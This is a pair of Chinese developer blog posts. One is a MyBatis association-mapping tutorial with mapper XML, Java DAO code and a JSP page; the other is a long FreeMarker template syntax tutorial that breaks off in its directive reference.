[html] view plaincopy<?xml version="1.0" encoding="UTF-8" ?>  <!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd">  <configuration>      <typeAliases>          <typeAlias alias="Account" type="com.cookiejoo.beans.Account" />          <typeAlias alias="Weibo" type="com.cookiejoo.beans.Weibo" />      </typeAliases>      <mappers>          <mapper resource="mybatisConfig/account-mapper.xml" />          <mapper resource="mybatisConfig/weibo-mapper.xml" />      </mappers>  </configuration>  重点在这个weibo-mapper.xml里面,这个也一样自己写他的sql映射account-mapper.xml
由于就演示一个表weibo关联表account,关联都在weibo-mapper.xml里面写.account-mapper.xml就不给大家了,没什么大碍的.
配置文件的详细我都写了,大家靠自己的悟性吧.
[html] view plaincopy<?xml version="1.0" encoding="UTF-8" ?>  <!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">  <!-- 命名空间都以pojo类的包命名,很长,但是也好区分,文档上说这是MyBatis现在的规定了 -->  <mapper namespace="com.cookiejoo.beans.Weibo">      <!-- 定义一张表,并且来个关联表 -->      <resultMap type="Weibo" id="weiboJoinAccountResultMap">          <id property="wId" column="w_id" />          <result property="wContext" column="w_context" />          <result property="wCreateTime" column="w_create_time" />          <!-- 关联account表 -->          <association property="account" column="w_acc_id"              javaType="Account" resultMap="joinAccountResult" />      </resultMap>            <!-- 关联表需要的列 -->      <resultMap type="Account" id="joinAccountResult">          <id property="aId" column="a_id" />          <result property="aUsername" column="a_username" />          <result property="aHeadImage" column="a_head_image" />      </resultMap>            <!-- 定义没有关联的单表查询返回结果 -->      <resultMap type="Weibo" id="weiboResultMap">          <id property="wId" column="w_id" />          <result property="wContext" column="w_context" />          <result property="wCreateTime" column="w_create_time" />          <!-- 关联account表 -->          <association property="account" column="w_acc_id"              javaType="Account" resultMap="joinAccountResult" />      </resultMap>            <!-- 根据创建时间查询 -->      <select id="findWeiboJoinAccount"          resultMap="weiboJoinAccountResultMap" parameterType="Weibo">          select w.w_id,w.w_context,w.w_create_time, a.a_id as          w_acc_id,a.a_username,a.a_head_image from weibo w left outer          join account a on w.w_acc_id = a.a_id where w.w_create_time >          #{wCreateTime} order by w.w_create_time desc      </select>            <!-- resultMap 返回 上面的结果 -->      <select id="findAllWeibo" resultMap="weiboResultMap">          select w.w_id,w.w_context,w.w_create_time, a.a_id          from weibo w left join account a on w.w_acc_id = a.a_id      </select>        <!-- 查询一条记录 -->      <!-- 注意:此处的关联,看pojo类是怎么写的,如果查询出现什么错误,得看这里了 -->      <select id="findAllWeiboById" parameterType="int"           resultMap="weiboResultMap">          select w.w_id,w.w_context,w.w_create_time, w.w_acc_id           from weibo w          where w.w_id = #{wId}      </select>            <!--        首先，如果你的数据库支持自动生成主键的字段（比如MySQL和SQL Server），      那么你可以设置useGeneratedKeys=”true”，      而且设置keyProperty到你已经做好的目标属性上。      例如，如果上面的Author表已经对id使用了自动生成的列类型，那么语句可以修改为      -->      <insert id="addWeibo" parameterType="Weibo" useGeneratedKeys="true"          keyProperty="wId">          insert into weibo(w_acc_id,w_context,w_create_time)          values(#{account.aId},#{wContext},#{wCreateTime})      </insert>            <!-- 修改 -->      <update id="updateWeibo" parameterType="Weibo">          update weibo set w_acc_id = #{account.aId},w_context = #{wContext},w_create_time = #{wCreateTime}          where w_id = #{wId}      </update>            <!-- 删除 -->      <delete id="deleteWeibo" parameterType="int">          delete from weibo where w_id = #{wId}      </delete>    </mapper> 
pojo类:这里你要注意了, 怎么给数据做搜集,
[java] view plaincopypackage com.cookiejoo.beans;    import java.util.Date;    public class Weibo {      private Integer wId;      private Account account;      private String wContext;      private Date wCreateTime;        public Weibo() {      }        public Integer getWId() {          return wId;      }        public void setWId(Integer wId) {          this.wId = wId;      }        public Account getAccount() {          return account;      }        public void setAccount(Account account) {          this.account = account;      }        public String getWContext() {          return wContext;      }        public void setWContext(String context) {          wContext = context;      }        public Date getWCreateTime() {          return wCreateTime;      }        public void setWCreateTime(Date createTime) {          wCreateTime = createTime;      }    } 
 
两张表结构很简单
id都是自动增长的;
Table weibo
===========
w_id, w_acc_id, w_context, w_create_time
-----------
w_id             int(11) PK
w_acc_id         int(11)
w_context        varchar(2000)
w_create_time    datetime
 
Table account
=============
a_id, a_username, a_password, a_sex, a_phone, a_brithday, a_create_time, a_head_image
-------------
a_id             int(11) PK
a_username       varchar(45)
a_password       varchar(45)
a_sex            int(2)
a_phone          varchar(15)
a_brithday       datetime
a_create_time    datetime
a_head_image     varchar(45)
这个是java调用的例子,一个接口一个实现类,我用了Spring集成了,所以和单独的MyBatis例子有点出入,大家对着MyBatis文档做时就是获取getSqlSession这个不一样而已.
[java] view plaincopypackage com.cookiejoo.iservice.impl;    import java.util.Date;  import java.util.List;    import org.mybatis.spring.support.SqlSessionDaoSupport;  import com.cookiejoo.beans.Weibo;  import com.cookiejoo.iservice.IWeiboService;    public class WeiboServiceImpl extends SqlSessionDaoSupport implements          IWeiboService {        @SuppressWarnings("unchecked")      public List<Weibo> findWeiboJoinAccount(Weibo w) {          return getSqlSession().selectList(                  "com.cookiejoo.beans.Weibo.findWeiboJoinAccount", w);      }        @SuppressWarnings("unchecked")      public List<Weibo> findAllWeibo() {          return getSqlSession().selectList(                  "com.cookiejoo.beans.Weibo.findAllWeibo");      }        public void addWeibo(Weibo w) {          w.setWCreateTime(new Date());          getSqlSession().insert("com.cookiejoo.beans.Weibo.addWeibo", w);      }        public void updateWeibo(Weibo w) {          getSqlSession().update("com.cookiejoo.beans.Weibo.updateWeibo", w);      }        public void deleteWeibo(Weibo w) {          getSqlSession().delete("com.cookiejoo.beans.Weibo.deleteWeibo", w);      }        public Weibo findAllWeiboById(Integer wId) {          return (Weibo) getSqlSession().selectOne(                  "com.cookiejoo.beans.Weibo.findAllWeiboById", wId);      }    } 
 
接着页面展示,我用jsp写的,用struts2做跳转...     myJsp.jsp
[html] view plaincopy<%@ page language="java" pageEncoding="UTF-8"%>  <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>  <%@ taglib prefix="s" uri="/struts-tags"%>    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">  <html xmlns="http://www.w3.org/1999/xhtml">      <head>          <meta http-equiv="content-type" content="text/html; charset=utf-8" />          <title>Condition  by Free CSS Templates</title>          <meta name="keywords" content="" />          <meta name="description" content="" />          <style type='text/css'>          #mytable {              padding: 0;              margin: 0;          }                    th {              color: #4f6b72;              border-left: 1px solid #C1DAD7;              border-right: 1px solid #C1DAD7;              border-bottom: 1px solid #C1DAD7;              border-top: 1px solid #C1DAD7;              letter-spacing: 2px;              text-transform: uppercase;              text-align: left;              padding: 6px 6px 6px 12px;              background: #CAE8EA no-repeat;          }                    td {              border-left: 1px solid #C1DAD7;              border-right: 1px solid #C1DAD7;              border-bottom: 1px solid #C1DAD7;              background: #fff;              padding: 6px 6px 6px 12px;              color: #4f6b72;          }          </style>      </head>        <body>      -------------------------------------------------------------------------------------------      <form action="findAllWeibo.action"><input value="findAllWeibo" type="submit"/>      <input name="weibo.wCreateTime" type="text" value="2011-01-01"/>      </form>      -------------------------------------------------------------------------------------------      <form action="addWeibo.action">      <input name="weibo.wContext" type="text" value="2011-01-01"/><br>      <input name="weibo.account.aId" type="text" value="1"/><br>      <input name="weibo.wCreateTime" type="text" value="2011-01-01"/>      <input value="addWeibo" type="submit"/>      </form>      -------------------------------------------------------------------------------------------      <form action="updateWeibo.action">      <input name="weibo.wContext" type="text" value="2011-02-01"/><br>      <input name="weibo.account.aId" type="text" value="2"/><br>      <input name="weibo.wCreateTime" type="text" value="2011-02-01"/>      <input name="weibo.wId" type="text" value="54"/>      <input value="updateWeibo" type="submit"/>      </form>            <a href="findWeiboByBean.action">findWeiboByBean</a>          <h3></h3>          <br>          <table id='mytable' cellspacing='0'  width='100%'>              <tr>              <th>id</th><th>context</th><th>createTime</th><th>aid</th><th>operator</th></tr>              <c:forEach items="${weibos}" var="weibo">                  <tr><td>${weibo.WId }</td><td>${weibo.WContext }</td><td>${weibo.WCreateTime }</td><td>${weibo.account.AId }</td><td><a href="deleteWeibo.action?weibo.wId=${weibo.WId }">delete</a></td></tr>              </c:forEach>          </table>      </body>              </html> 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
一篇很全面的freemarker教程, zz563143188.iteye.com.blog.1930931, Mon, 26 Aug 2013 13:25:52 +0800

copy自http://demojava.iteye.com/blog/800204  
 
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
演示项目源码请下载codeFactory20130321,lib20130321文件,
以下内容全部是网上收集：
FreeMarker的模板文件并不比HTML页面复杂多少,FreeMarker模板文件主要由如下4个部分组成: 1,文本:直接输出的部分 2,注释:<#-- ... -->格式部分,不会输出 3,插值:即${...}或#{...}格式的部分,将使用数据模型中的部分替代输出 4,FTL指令:FreeMarker指定,和HTML标记类似,名字前加#予以区分,不会输出
下面是一个FreeMarker模板的例子,包含了以上所说的4个部分 <html><br> <head><br> <title>Welcome!</title><br> </head><br> <body><br> <#-- 注释部分 --><br> <#-- 下面使用插值 --> <h1>Welcome ${user} !</h1><br> <p>We have these animals:<br> <u1><br> <#-- 使用FTL指令 --> <#list animals as being><br>    <li>${being.name} for ${being.price} Euros<br> <#list><br> <u1><br> </body><br> </html>
1, FTL指令规则
在FreeMarker中,使用FTL标签来使用指令,FreeMarker有3种FTL标签,这和HTML标签是完全类似的. 1,开始标签:<#directivename parameter> 2,结束标签:</#directivename> 3,空标签:<#directivename parameter/>
实际上,使用标签时前面的符号#也可能变成@,如果该指令是一个用户指令而不是系统内建指令时,应将#符号改成@符号. 使用FTL标签时, 应该有正确的嵌套,而不是交叉使用,这和XML标签的用法完全一样.如果全用不存在的指令,FreeMarker不会使用模板输出,而是产生一个错误消息.FreeMarker会忽略FTL标签中的空白字符.值得注意的是< , /> 和指令之间不允许有空白字符.
2, 插值规则
FreeMarker的插值有如下两种类型:1,通用插值${expr};2,数字格式化插值:#{expr}或#{expr;format}
2.1 通用插值
对于通用插值,又可以分为以下4种情况: 1,插值结果为字符串值:直接输出表达式结果 2,插值结果为数字值:根据默认格式(由#setting指令设置)将表达式结果转换成文本输出.可以使用内建的字符串函数格式化单个插值,如下面的例子: <#settion number_format="currency"/> <#assign answer=42/> ${answer} ${answer?string} <#-- the same as ${answer} --> ${answer?string.number} ${answer?string.currency} ${answer?string.percent} ${answer} 输出结果是: $42.00 $42.00 42 $42.00 4,200% 3,插值结果为日期值:根据默认格式(由#setting指令设置)将表达式结果转换成文本输出.可以使用内建的字符串函数格式化单个插值,如下面的例子: ${lastUpdated?string("yyyy-MM-dd HH:mm:ss zzzz")} ${lastUpdated?string("EEE, MMM d, ''yy")} ${lastUpdated?string("EEEE, MMMM dd, yyyy, hh:mm:ss a '('zzz')'")} 输出结果是: 2008-04-08 08:08:08 Pacific Daylight Time Tue, Apr 8, '03 Tuesday, April 08, 2003, 08:08:08 PM (PDT) 4,插值结果为布尔值:根据默认格式(由#setting指令设置)将表达式结果转换成文本输出.可以使用内建的字符串函数格式化单个插值,如下面的例子: <#assign foo=true/> ${foo?string("yes", "no")} 输出结果是: yes
2.2 数字格式化插值
数字格式化插值可采用#{expr;format}形式来格式化数字,其中format可以是: mX:小数部分最小X位 MX:小数部分最大X位 如下面的例子: <#assign x=2.582/> <#assign y=4/> #{x; M2} <#-- 输出2.58 --> #{y; M2} <#-- 输出4 --> #{x; m2} <#-- 输出2.6 --> #{y; m2} <#-- 输出4.0 --> #{x; m1M2} <#-- 输出2.58 --> #{x; m1M2} <#-- 输出4.0 -->
3, 表达式
表达式是FreeMarker模板的核心功能,表达式放置在插值语法${}之中时,表明需要输出表达式的值;表达式语法也可与FreeMarker 标签结合,用于控制输出.实际上FreeMarker的表达式功能非常强大,它不仅支持直接指定值,输出变量值,也支持字符串格式化输出和集合访问等功能.
3.1 直接指定值
使用直接指定值语法让FreeMarker直接输出插值中的值,而不是输出变量值.直接指定值可以是字符串,数值,布尔值,集合和MAP对象.
1,字符串 直接指定字符串值使用单引号或双引号限定,如果字符串值中包含特殊字符需要转义,看下面的例子: ${"我的文件保存在C:\\盘"} ${'我名字是\"annlee\"'} 输出结果是: 我的文件保存在C:\盘 我名字是"annlee"
FreeMarker支持如下转义字符: \";双引号(u0022) \';单引号(u0027) \\;反斜杠(u005C) \n;换行(u000A) \r;回车(u000D) \t;Tab(u0009) \b;退格键(u0008) \f;Form feed(u000C) \l;< \g;> \a;& \{;{ \xCode;直接通过4位的16进制数来指定Unicode码,输出该unicode码对应的字符.
如果某段文本中包含大量的特殊符号,FreeMarker提供了另一种特殊格式:可以在指定字符串内容的引号前增加r标记,在r标记后的文件将会直接输出.看如下代码: ${r"${foo}"} ${r"C:\foo\bar"} 输出结果是: ${foo} C:\foo\bar
2,数值 表达式中的数值直接输出,不需要引号.小数点使用"."分隔,不能使用分组","符号.FreeMarker目前还不支持科学计数法,所以"1E3"是错误的.在FreeMarker表达式中使用数值需要注意以下几点: 1,数值不能省略小数点前面的0,所以".5"是错误的写法 2,数值8 , +8 , 8.00都是相同的
3,布尔值 直接使用true和false,不使用引号.
4,集合 集合以方括号包括,各集合元素之间以英文逗号","分隔,看如下的例子: <#list ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期天"] as x> ${x} </#list> 输出结果是: 星期一 星期二 星期三 星期四 星期五 星期六 星期天
除此之外,集合元素也可以是表达式,例子如下: [2 + 2, [1, 2, 3, 4], "whatnot"]
还可以使用数字范围定义数字集合,如2..5等同于[2, 3, 4, 5],但是更有效率.注意,使用数字范围来定义集合时无需使用方括号,数字范围也支持反递增的数字范围,如5..2
5,Map对象 Map对象使用花括号包括,Map中的key-value对之间以英文冒号":"分隔,多组key-value对之间以英文逗号","分隔.下面是一个例子: {"语文":78, "数学":80} Map对象的key和value都是表达式,但是key必须是字符串
3.2 输出变量值
FreeMarker的表达式输出变量时,这些变量可以是顶层变量,也可以是Map对象中的变量,还可以是集合中的变量,并可以使用点(.)语法来访问Java对象的属性.下面分别讨论这些情况
1,顶层变量 所谓顶层变量就是直接放在数据模型中的值,例如有如下数据模型: Map root = new HashMap();   //创建数据模型 root.put("name","annlee");   //name是一个顶层变量
对于顶层变量,直接使用${variableName}来输出变量值,变量名只能是字母,数字,下划线,$,@和#的组合,且不能以数字开头号.为了输出上面的name的值,可以使用如下语法: ${name}
2,输出集合元素 如果需要输出集合元素,则可以根据集合元素的索引来输出集合元素,集合元素的索引以方括号指定.假设有索引: ["星期一","星期二","星期三","星期四","星期五","星期六","星期天"].该索引名为week,如果需要输出星期三,则可以使用如下语法: ${week[2]}   //输出第三个集合元素
此外,FreeMarker还支持返回集合的子集合,如果需要返回集合的子集合,则可以使用如下语法: week[3..5]   //返回week集合的子集合,子集合中的元素是week集合中的第4-6个元素
3,输出Map元素 这里的Map对象可以是直接HashMap的实例,甚至包括JavaBean实例,对于JavaBean实例而言,我们一样可以把其当成属性为key,属性值为value的Map实例.为了输出Map元素的值,可以使用点语法或方括号语法.假如有下面的数据模型: Map root = new HashMap(); Book book = new Book(); Author author = new Author(); author.setName("annlee"); author.setAddress("gz"); book.setName("struts2"); book.setAuthor(author); root.put("info","struts"); root.put("book", book);
为了访问数据模型中名为struts2的书的作者的名字,可以使用如下语法: book.author.name    //全部使用点语法 book["author"].name book.author["name"]    //混合使用点语法和方括号语法 book["author"]["name"]   //全部使用方括号语法
使用点语法时,变量名字有顶层变量一样的限制,但方括号语法没有该限制,因为名字可以是任意表达式的结果.
3.3, 字符串操作
FreeMarker的表达式对字符串操作非常灵活,可以将字符串常量和变量连接起来,也可以返回字符串的子串等.
字符串连接有两种语法: 1,使用${..}或#{..}在字符串常量部分插入表达式的值,从而完成字符串连接. 2,直接使用连接运算符+来连接字符串
例如有如下数据模型: Map root = new HashMap(); root.put("user","annlee"); 下面将user变量和常量连接起来: ${"hello, ${user}!"}   //使用第一种语法来连接 ${"hello, " + user + "!"} //使用+号来连接 上面的输出字符串都是hello,annlee!,可以看出这两种语法的效果完全一样.
值得注意的是,${..}只能用于文本部分,不能用于表达式,下面的代码是错误的: <#if ${isBig}>Wow!</#if> <#if "${isBig}">Wow!</#if> 应该写成:<#if isBig>Wow!</#if>
截取子串可以根据字符串的索引来进行,截取子串时如果只指定了一个索引值,则用于取得字符串中指定索引所对应的字符;如果指定两个索引值,则返回两个索引中间的字符串子串.假如有如下数据模型: Map root = new HashMap(); root.put("book","struts2,freemarker"); 可以通过如下语法来截取子串: ${book[0]}${book[4]}   //结果是su ${book[1..4]}     //结果是tru
3.4 集合连接运算符
这里所说的集合运算符是将两个集合连接成一个新的集合,连接集合的运算符是+,看如下的例子: <#list ["星期一","星期二","星期三"] + ["星期四","星期五","星期六","星期天"] as x> ${x} </#list> 输出结果是:星期一 星期二 星期三 星期四 星期五 星期六 星期天
3.5 Map连接运算符
Map对象的连接运算符也是将两个Map对象连接成一个新的Map对象,Map对象的连接运算符是+,如果两个Map对象具有相同的key,则右边的值替代左边的值.看如下的例子: <#assign scores = {"语文":86,"数学":78} + {"数学":87,"Java":93}> 语文成绩是${scores.语文} 数学成绩是${scores.数学} Java成绩是${scores.Java} 输出结果是: 语文成绩是86 数学成绩是87 Java成绩是93
3.6 算术运算符
FreeMarker表达式中完全支持算术运算,FreeMarker支持的算术运算符包括:+, - , * , / , % 看如下的代码: <#assign x=5> ${ x * x - 100 } ${ x /2 } ${ 12 %10 } 输出结果是: -75   2.5   2
在表达式中使用算术运算符时要注意以下几点: 1,运算符两边的运算数字必须是数字 2,使用+运算符时,如果一边是数字,一边是字符串,就会自动将数字转换为字符串再连接,如:${3 + "5"},结果是:35
使用内建的int函数可对数值取整,如: <#assign x=5> ${ (x/2)?int } ${ 1.1?int } ${ 1.999?int } ${ -1.1?int } ${ -1.999?int } 结果是:2 1 1 -1 -1
3.7 比较运算符
表达式中支持的比较运算符有如下几个: 1,=或者==:判断两个值是否相等. 2,!=:判断两个值是否不等. 3,>或者gt:判断左边值是否大于右边值 4,>=或者gte:判断左边值是否大于等于右边值 5,<或者lt:判断左边值是否小于右边值 6,<=或者lte:判断左边值是否小于等于右边值
注意:=和!=可以用于字符串,数值和日期来比较是否相等,但=和!=两边必须是相同类型的值,否则会产生错误,而且FreeMarker是精确比较,"x","x ","X"是不等的.其它的运行符可以作用于数字和日期,但不能作用于字符串,大部分的时候,使用gt等字母运算符代替>会有更好的效果,因为 FreeMarker会把>解释成FTL标签的结束字符,当然,也可以使用括号来避免这种情况,如:<#if (x>y)>
3.8 逻辑运算符
逻辑运算符有如下几个: 逻辑与:&& 逻辑或:|| 逻辑非:! 逻辑运算符只能作用于布尔值,否则将产生错误
3.9 内建函数
FreeMarker还提供了一些内建函数来转换输出,可以在任何变量后紧跟?,?后紧跟内建函数,就可以通过内建函数来轮换输出变量.下面是常用的内建的字符串函数: html:对字符串进行HTML编码 cap_first:使字符串第一个字母大写 lower_case:将字符串转换成小写 upper_case:将字符串转换成大写 trim:去掉字符串前后的空白字符
下面是集合的常用内建函数 size:获取序列中元素的个数
下面是数字值的常用内建函数 int:取得数字的整数部分,结果带符号
例如: <#assign test="Tom & Jerry"> ${test?html} ${test?upper_case?html} 结果是:Tom &amp; Jerry   TOM &amp; JERRY
3.10 空值处理运算符
FreeMarker对空值的处理非常严格,FreeMarker的变量必须有值,没有被赋值的变量就会抛出异常,因为FreeMarker未赋值的变量强制出错可以杜绝很多潜在的错误,如缺失潜在的变量命名,或者其他变量错误.这里所说的空值,实际上也包括那些并不存在的变量,对于一个Java的 null值而言,我们认为这个变量是存在的,只是它的值为null,但对于FreeMarker模板而言,它无法理解null值,null值和不存在的变量完全相同.
为了处理缺失变量,FreeMarker提供了两个运算符: !:指定缺失变量的默认值 ??:判断某个变量是否存在
其中,!运算符的用法有如下两种: variable!或variable!defaultValue,第一种用法不给缺失的变量指定默认值,表明默认值是空字符串,长度为0的集合,或者长度为0的Map对象.
使用!指定默认值时,并不要求默认值的类型和变量类型相同.使用??运算符非常简单,它总是返回一个布尔值,用法为:variable??,如果该变量存在,返回true,否则返回false
3.11 运算符的优先级
FreeMarker中的运算符优先级如下(由高到低排列): 1,一元运算符:! 2,内建函数:? 3,乘除法:*, / , % 4,加减法:- , + 5,比较:> , < , >= , <= (lt , lte , gt , gte) 6,相等:== , = , != 7,逻辑与:&& 8,逻辑或:|| 9,数字范围:..
实际上,我们在开发过程中应该使用括号来严格区分,这样的可读性好,出错少
4 FreeMarker的常用指令
FreeMarker的FTL指令也是模板的重要组成部分,这些指令可实现对数据模型所包含数据的抚今迭代,分支控制.除此之外,还有一些重要的功能,也是通过FTL指令来实现的.
4.1 if指令
这是一个典型的分支控制指令,该指令的作用完全类似于Java语言中的if,if指令的语法格式如下: <#if condition>... <#elseif condition>... <#elseif condition>... <#else> ... </#if>
例子如下: <#assign age=23> <#if (age>60)>老年人 <#elseif (age>40)>中年人 <#elseif (age>20)>青年人 <#else> 少年人 </#if> 输出结果是:青年人 上面的代码中的逻辑表达式用括号括起来主要是因为里面有>符号,由于FreeMarker会将>符号当成标签的结束字符,可能导致程序出错,为了避免这种情况,我们应该在凡是出现这些符号的地方都使用括号.
4.2 switch , case , default , break指令
这些指令显然是分支指令,作用类似于Java的switch语句,switch指令的语法结构如下: <#switch value> <#case refValue>...<#break> <#case refValue>...<#break> <#default>... </#switch>
4.3 list, break指令
list指令是一个迭代输出指令,用于迭代输出数据模型中的集合,list指令的语法格式如下: <#list sequence as item> ... </#list> 上面的语法格式中,sequence就是一个集合对象,也可以是一个表达式,但该表达式将返回一个集合对象,而item是一个任意的名字,就是被迭代输出的集合元素.此外,迭代集合对象时,还包含两个特殊的循环变量: item_index:当前变量的索引值 item_has_next:是否存在下一个对象 也可以使用<#break>指令跳出迭代
例子如下: <#list ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期天"] as x> ${x_index + 1}.${x}<#if x_has_next>,</if> <#if x="星期四"><#break></#if> </#list>
4.4 include指令
include指令的作用类似于JSP的包含指令,用于包含指定页.include指令的语法格式如下: <#include filename [options]> 在上面的语法格式中,两个参数的解释如下: filename:该参数指定被包含的模板文件 options:该参数可以省略,指定包含时的选项,包含encoding和parse两个选项,其中encoding指定包含页面时所用的解码集,而parse指定被包含文件是否作为FTL文件来解析,如果省略了parse选项值,则该选项默认是true.
4.5 import指令
该指令用于导入FreeMarker模板中的所有变量,并将该变量放置在指定的Map对象中,import指令的语法格式如下: <#import "/lib/common.ftl" as com> 上面的代码将导入/lib/common.ftl模板文件中的所有变量,交将这些变量放置在一个名为com的Map对象中.
4.6 noparse指令
noparse指令指定FreeMarker不处理该指定里包含的内容,该指令的语法格式如下: <#noparse>...</#noparse>
看如下的例子: <#noparse> <#list books as book>    <tr><td>${book.name}<td>作者:${book.author} </#list> </#noparse> 输出如下: <#list books as book>    <tr><td>${book.name}<td>作者:${book.author} </#list>
4.7 escape , noescape指令
escape指令导致body区的插值都会被自动加上escape表达式,但不会影响字符串内的插值,只会影响到body内出现的插值,使用escape指令的语法格式如下: <#escape identifier as expression>... <#noescape>...</#noescape> </#escape>
看如下的代码: <#escape x as x?html> First name:${firstName} Last name:${lastName} Maiden name:${maidenName} </#escape> 上面的代码等同于: First name:${firstName?html} Last name:${lastName?html} Maiden name:${maidenName?html}
escape指令在解析模板时起作用而不是在运行时起作用,除此之外,escape指令也嵌套使用,子escape继承父escape的规则,如下例子: <#escape x as x?html> Customer Name:${customerName} Items to ship; <#escape x as itemCodeToNameMap[x]>    ${itemCode1}    ${itemCode2}    ${itemCode3}    ${itemCode4} </#escape> </#escape> 上面的代码类似于: Customer Name:${customerName?html} Items to ship; ${itemCodeToNameMap[itemCode1]?html} ${itemCodeToNameMap[itemCode2]?html} ${itemCodeToNameMap[itemCode3]?html} ${itemCodeToNameMap[itemCode4]?html}
对于放在escape指令中所有的插值而言,这此插值将被自动加上escape表达式,如果需要指定escape指令中某些插值无需添加escape表达式,则应该使用noescape指令,放在noescape指令中的插值将不会添加escape表达式.
4.8 assign指令
assign指令在前面已经使用了多次,它用于为该模板页面创建或替换一个顶层变量,assign指令的用法有多种,包含创建或替换一个顶层变量, 或者创建或替换多个变量等,它的最简单的语法如下:<#assign name=value [in namespacehash]>,这个用法用于指定一个名为name的变量,该变量的值为value,此外,FreeMarker允许在使用 assign指令里增加in子句,in子句用于将创建的name变量放入namespacehash命名空间中.
assign指令还有如下用法:<#assign name1=value1 name2=value2 ... nameN=valueN [in namespacehash]>,这个语法可以同时创建或替换多个顶层变量,此外,还有一种复杂的用法,如果需要创建或替换的变量值是一个复杂的表达式,则可以使用如下语法格式:<#assign name [in namespacehash]>capture this</#assign>,在这个语法中,是指将assign指令的内容赋值给name变量.如下例子: <#assign x> <#list ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期天"] as n> ${n} </#list> </#assign> ${x} 上面的代码将产生如下输出:星期一 星期二 星期三 星期四 星期五 星期六 星期天
虽然assign指定了这种复杂变量值的用法,但是我们也不要滥用这种用法,如下例子:<#assign x>Hello ${user}!</#assign>,以上代码改为如下写法更合适:<#assign x="Hello ${user}!">
4.9 setting指令
该指令用于设置FreeMarker的运行环境,该指令的语法格式如下:<#setting name=value>,在这个格式中,name的取值范围包含如下几个: locale:该选项指定该模板所用的国家/语言选项 number_format:指定格式化输出数字的格式 boolean_format:指定两个布尔值的语法格式,默认值是true,false date_format,time_format,datetime_format:指定格式化输出日期的格式 time_zone:设置格式化输出日期时所使用的时区
4.10 macro , nested , return指令
macro可以用于实现自定义指令,通过使用自定义指令,可以将一段模板片段定义成一个用户指令,使用macro指令的语法格式如下: <#macro name param1 param2 ... paramN> ... <#nested loopvar1, loopvar2, ..., loopvarN> ... <#return> ... </#macro> 在上面的格式片段中,包含了如下几个部分: name:name属性指定的是该自定义指令的名字,使用自定义指令时可以传入多个参数 paramX:该属性就是指定使用自定义指令时报参数,使用该自定义指令时,必须为这些参数传入值 nested指令:nested标签输出使用自定义指令时的中间部分 nested指令中的循环变量:这此循环变量将由macro定义部分指定,传给使用标签的模板 return指令:该指令可用于随时结束该自定义指令.
看如下的例子: <#macro book>   //定义一个自定义指令 j2ee </#macro> <@book />    //使用刚才定义的指令 上面的代码输出结果为:j2ee
在上面的代码中,可能很难看出自定义标签的用处,因为我们定义的book指令所包含的内容非常简单,实际上,自定义标签可包含非常多的内容,从而可以实现更好的代码复用.此外,还可以在定义自定义指令时,为自定义指令指定参数,看如下代码: <#macro book booklist>     //定义一个自定义指令booklist是参数 <#list booklist as book>    ${book} </#list> </#macro> <@book booklist=["spring","j2ee"] />   //使用刚刚定义的指令 上面的代码为book指令传入了一个参数值,上面的代码的输出结果为:spring j2ee
不仅如此,还可以在自定义指令时使用nested指令来输出自定义指令的中间部分,看如下例子: <#macro page title> <html> <head>    <title>FreeMarker示例页面 - ${title?html}</title> </head> <body>    <h1>${title?html}</h1>    <#nested>      //用于引入用户自定义指令的标签体 </body> </html> </#macro> 上面的代码将一个HTML页面模板定义成一个page指令,则可以在其他页面中如此page指令: <#import "/common.ftl" as com>     //假设上面的模板页面名为common.ftl,导入页面 <@com.page title="book list"> <u1> <li>spring</li> <li>j2ee</li> </ul> </@com.page>
从上面的例子可以看出,使用macro和nested指令可以非常容易地实现页面装饰效果,此外,还可以在使用nested指令时,指定一个或多个循环变量,看如下代码: <#macro book> <#nested 1>      //使用book指令时指定了一个循环变量值 <#nested 2> </#macro> <@book ;x> ${x} .图书</@book> 当使用nested指令传入变量值时,在使用该自定义指令时,就需要使用一个占位符(如book指令后的;x).上面的代码输出文本如下: 1 .图书    2 .图书
在nested指令中使用循环变量时,可以使用多个循环变量,看如下代码: <#macro repeat count> <#list 1..count as x>     //使用nested指令时指定了三个循环变量    <#nested x, x/2, x==count> </#list> </#macro> <@repeat count=4 ; c halfc last> ${c}. ${halfc}<#if last> Last! </#if> </@repeat> 上面的输出结果为: 1. 0.5   2. 1   3. 1.5   4. 2 Last;
return指令用于结束macro指令,一旦在macro指令中执行了return指令,则FreeMarker不会继续处理macro指令里的内容,看如下代码: <#macro book> spring <#return> j2ee </#macro> <@book /> 上面的代码输出:spring,而j2ee位于return指令之后,不会输出.
if, else, elseif switch, case, default, break list, break include Import compress escape, noescape assign global setting macro, nested, return t, lt, rt 3一些常用方法或注意事项 表达式转换类 数字循环 对浮点取整数 给变量默认值 判断对象是不是null 常用格式化日期 添加全局共享变量数据模型 直接调用java对象的方法 字符串处理(内置方法) 在模板里对sequences和hashes初始化 注释标志 sequences内置方法 hashes内置方法 4 freemarker在web开发中注意事项 web中常用的几个对象 view中值的搜索顺序 在模板里ftl里使用标签 如何初始化共享变量 与webwork整合配置 5高级方法 自定义方法 自定义 Transforms
                                 1概念 最常用的3个概念 sequence  序列，对应java里的list、数组等非键值对的集合 hash      键值对的集合 namespace 对一个ftl文件的引用,利用这个名字可以访问到该ftl文件的资源
2指令 if, else, elseif 语法 <#if condition>   ... <#elseif condition2>   ... <#elseif condition3>   ... ... <#else>   ... </#if> 用例 <#if x = 1>   x is 1 </#if>
<#if x = 1>   x is 1 <#else>   x is not 1 </#if>
switch, case, default, break 语法 <#switch value>   <#case refValue1>     ...     <#break>   <#case refValue2>     ...     <#break>   ...   <#case refValueN>     ...     <#break>   <#default>     ... </#switch>
